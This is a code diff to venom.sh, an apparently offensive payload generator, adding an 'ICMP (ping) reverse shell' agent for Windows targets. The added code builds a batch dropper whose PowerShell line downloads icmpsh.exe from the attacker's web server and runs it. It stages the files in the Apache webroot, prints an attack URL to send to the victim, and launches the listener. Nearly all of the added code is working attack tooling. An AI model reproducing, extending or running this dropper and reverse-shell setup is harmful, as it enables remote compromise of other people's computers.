@@ -371,6 +371,13 @@ rm /tmp/shell.exe > /dev/null 2>&1
 rm $ApAcHe/shell.exe > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.rtf > /dev/null 2>&1
+# icmp (ping) shell
+if [ "$ICMPDIS" = "disabled" ]; then
+   echo "${RedF}[x]${white} Local ICMP Replies are disable (enable ICMP replies)${white}"
+   sysctl -w net.ipv4.icmp_echo_ignore_all=0 >/dev/null 2>&1
+fi
+rm $ApAcHe/$N4m.bat > /dev/null 2>&1
+rm $ApAcHe/icmpsh.exe > /dev/null 2>&1
 # exit venom.sh
 echo ${BlueF}[☠]${white} Exit Shellcode Generator...${Reset}
 echo ${BlueF}[☠]${white} [_Codename:$C0d3]${Reset}
@@ -11237,6 +11244,85 @@ fi
 
 
 
+# --------------------
+# ICMP (ping) SHELL
+# --------------------
+sh_icmp_shell () {
+# get user input to build shellcode
+echo "[☠] Enter agent settings!"
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+target=$(zenity --title="☠ Enter RHOST ☠" --text "example: 192.168.1.72" --entry --width 300) > /dev/null 2>&1
+N4m=$(zenity --title="☠ Enter Dropper FileName ☠" --text "example: dropper" --entry --width 300) > /dev/null 2>&1
+rpath=$(zenity --title="☠ Enter target upload path ☠" --text "example: %tmp%" --entry --width 300) > /dev/null 2>&1
+if [ -z "$rpath" ]; then
+rpath="%tmp%"
+fi
+
+# display final settings to user
+cat << !
+
+    venom settings
+    ╔─────────────────────
+    | LHOST  : $lhost
+    | TARGET : $target
+    | UPLOAD : $rpath\icmpsh.exe
+    | FORMAT : ICMP (ping) shell
+    |_DISCLOSURE: @Daniel Compton
+
+!
+sleep 2
+## Disable ICMP ping replies
+LOCALICMP=$(cat /proc/sys/net/ipv4/icmp_echo_ignore_all)
+if [ "$LOCALICMP" -eq 0 ]; then 
+   echo "${RedF}[x]${white} Local ICMP Replies are enabled (disable temporarily)${white}"
+   sysctl -w net.ipv4.icmp_echo_ignore_all=1 > /dev/null 2>&1
+   ICMPDIS="disabled"
+fi
+
+
+## Build batch dropper
+echo "[☠] Build batch dropper: $N4m.bat ..";sleep 2
+echo "@echo off" > $IPATH/output/$N4m.bat
+echo "powershell -w 1 -C (new-Object Net.WebClient).DownloadFile('http://$IP/icmpsh.exe', '$rpath\\icmpsh.exe') && start $rpath\\icmpsh.exe -t $IP -d 500 -b 30 -s 128" >> $IPATH/output/$N4m.bat
+echo "exit" >> $IPATH/output/$N4m.bat
+
+
+## Copy files to apache2 webroot
+echo "[☠] Porting ALL files to apache2 webroot ..";sleep 2
+cp $IPATH/bin/icmpsh/icmpsh.exe $ApAcHe/icmpsh.exe > /dev/nul 2>&1
+cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat > /dev/nul 2>&1
+
+
+## Print attack vector on terminal
+echo "---"
+echo "- SEND THE URL GENERATED TO TARGET HOST"
+echo "- ATTACK VECTOR: http://$IP/$N4m.bat"
+echo "---"
+echo "[☠] Launching Listener, waiting for inbound connection ..";sleep 1
+cd $IPATH/bin/icmpsh
+xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "python icmpsh_m.py $IP $target"
+cd $IPATH
+
+
+## Exit script execution
+if [ "$ICMPDIS" = "disabled" ]; then
+   echo "${GreenF}[☠]${white} Enabling Local ICMP Replies again now.${white}";sleep 2
+   sysctl -w net.ipv4.icmp_echo_ignore_all=0 > /dev/null 2>&1
+fi
+
+
+## Clean recent files
+echo "[☠] Cleanning temp generated files...";sleep 2
+rm $ApAcHe/$N4m.bat > /dev/nul 2>&1
+rm $ApAcHe/icmpsh.exe > /dev/nul 2>&1
+cd $IPATH
+zenity --title="☠ ICMP (ping) shell ☠" --text "REMARK:\nRemmenber to delete 'icmpsh.exe' from target system." --info --width 300 > /dev/null 2>&1
+sh_microsoft_menu
+}
+
+
+
+
 
 # -----------------------------
 # INTERACTIVE SHELLS (built-in) 
@@ -11618,6 +11704,12 @@ else
 /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 fi
 
+# icmp (ping) shell
+if [ "$ICMPDIS" = "disabled" ]; then
+  sysctl -w net.ipv4.icmp_echo_ignore_all=0 > /dev/null 2>&1
+fi
+rm $ApAcHe/$N4m.bat > /dev/null 2>&1
+rm $ApAcHe/icmpsh.exe > /dev/null 2>&1
 rm $IPATH/templates/hta_attack/index[bak].html > /dev/null 2>&1
 cd $IPATH
 cd ..
@@ -12442,6 +12534,13 @@ cat << !
     | AGENT EXECUTION    : http://$IP/EasyFileSharing.hta
     | DETECTION RATIO    : https://goo.gl/R8UNW3
 
+    AGENT Nº21:
+    ╔──────────────────────────────────────────────────────────────
+    | DESCRIPTION        : ICMP (ping) reverse shell
+    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
+    | AGENT EXTENSION    : EXE
+    | LAUNCHER EXTENSION : BAT
+    | AGENT EXECUTION    : http://$IP/dropper.bat
 
     ╔─────────────────────────────────────────────────────────────╗
     ║   M    - Return to main menu                                ║
@@ -12475,6 +12574,7 @@ case $choice in
 18) sh_shellcode25 ;;
 19) sh_shellcodecsharp ;;
 20) sh_certutil ;;
+21) sh_icmp_shell ;;
 m|M) sh_menu ;;
 e|E) sh_exit ;;
 *) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_microsoft_menu ;;
